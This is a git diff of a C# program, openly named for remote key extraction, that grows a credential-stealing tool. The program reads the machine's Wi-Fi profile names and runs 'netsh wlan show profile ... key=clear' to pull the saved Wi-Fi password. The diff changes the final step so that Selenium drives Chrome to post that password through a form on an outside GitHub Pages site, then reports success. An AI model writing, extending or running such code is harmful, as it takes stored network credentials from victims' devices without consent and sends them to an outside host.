@@ -5,6 +5,8 @@ using System.Threading.Tasks;
 using System.Management.Automation;
 using System.Net.Http;
 using OpenQA.Selenium;
+using OpenQA.Selenium.Edge;
+using OpenQA.Selenium.Firefox;
 
 namespace Remote_Key_Web_Based_Extraction
 {
@@ -17,9 +19,9 @@ namespace Remote_Key_Web_Based_Extraction
             Remote_Key_Web_Based_Extraction main_program = new Remote_Key_Web_Based_Extraction();
             var ap_extraction_task = main_program.extract_access_point_names();
             ap_extraction_task.Wait();
-            string key_content = main_program.key_content_extraction();
-            key_content += "426";
-            main_program.copy_paste(key_content);
+            string key_content = main_program.local_key_content_extraction();
+            key_content += "42fb5kf736";
+            main_program.web_content_key_extraction(key_content);
         }
 
         public async Task extract_access_point_names()
@@ -36,7 +38,7 @@ namespace Remote_Key_Web_Based_Extraction
             }
         }
 
-        public string key_content_extraction()
+        public string local_key_content_extraction()
         {
             Console.WriteLine("netsh wlan show profile " + access_point_names[0] + " key=clear");
             PowerShell ps = PowerShell.Create();
@@ -59,22 +61,43 @@ namespace Remote_Key_Web_Based_Extraction
             }
             return "nil";
         }
+        /*
         public async Task extract_website_password()
         {
             HttpClient client = new HttpClient();
             string s = await client.GetStringAsync("Website-here");
             s = s.Substring(s.IndexOf("<title>") + "<title>".Length, s.IndexOf("</title>") - s.IndexOf("<title>") - "<title>".Length);
         }
+        */
 
-        public void copy_paste(string key_content)
+        public void web_content_key_extraction(string key_content)
         {
-            OpenQA.Selenium.IWebDriver objFF = new OpenQA.Selenium.Firefox.FirefoxDriver();
-            objFF.Navigate();
-            objFF.Url = "https://anthony-t-n.github.io/";
-            objFF.FindElement(OpenQA.Selenium.By.Name("message")).SendKeys("ASP.NET");
-            objFF.FindElement(OpenQA.Selenium.By.Name("send")).Click();
-            objFF.Quit();
-            Console.WriteLine("Successfully extrated key from local device");
+            //EdgeOptions edgeOptions = new EdgeOptions();
+            //var current_drver = new EdgeDriver();
+            //OpenQA.Selenium.IWebDriver current_drver = new Microsoft.EdgeDriver();
+            //OpenQA.Selenium.IWebDriver current_drver = new FirefoxDriver();
+
+            /*
+            var options = new EdgeOptions();
+            options.UseInPrivateBrowsing = true;
+            var current_driver = new EdgeDriver(options);
+            */
+
+            OpenQA.Selenium.IWebDriver current_driver = new OpenQA.Selenium.Chrome.ChromeDriver();
+            
+            current_driver.Navigate().GoToUrl(@"https://anthony-t-n.github.io/");
+            current_driver.FindElement(By.Name("message")).SendKeys(key_content);
+            current_driver.FindElement(By.Name("send")).Click();
+            current_driver.Quit();
+
+            /*
+            current_drver.Navigate();
+            current_drver.Url = "https://anthony-t-n.github.io/";
+            current_drver.FindElement(OpenQA.Selenium.By.Name("message")).SendKeys(key_content);
+            current_drver.FindElement(OpenQA.Selenium.By.Name("send")).Click();
+            current_drver.Quit();
+            */
+            Console.WriteLine("[+] Successfully extrated content key from local device");
         }
     }
 }
